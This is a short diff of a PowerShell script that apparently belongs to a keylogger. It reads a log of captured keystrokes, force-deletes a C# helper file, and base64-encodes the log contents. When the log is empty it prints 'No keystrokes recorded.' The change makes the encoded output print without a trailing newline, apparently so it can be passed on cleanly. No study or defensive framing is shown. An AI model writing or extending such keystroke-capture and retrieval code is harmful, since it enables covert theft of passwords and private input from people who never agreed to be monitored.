@@ -27,7 +27,9 @@ if (Test-Path $logFile) {
     Remove-Item $csharpFile -Force -ErrorAction SilentlyContinue
     if ($content) {
         $bytes = [System.Text.Encoding]::UTF8.GetBytes($content)
-        [System.Convert]::ToBase64String($bytes)
+        $base64 = [System.Convert]::ToBase64String($bytes)
+        # Output base64 WITHOUT trailing newline
+        [System.Console]::Out.Write($base64)
     } else {
         "No keystrokes recorded."
     }
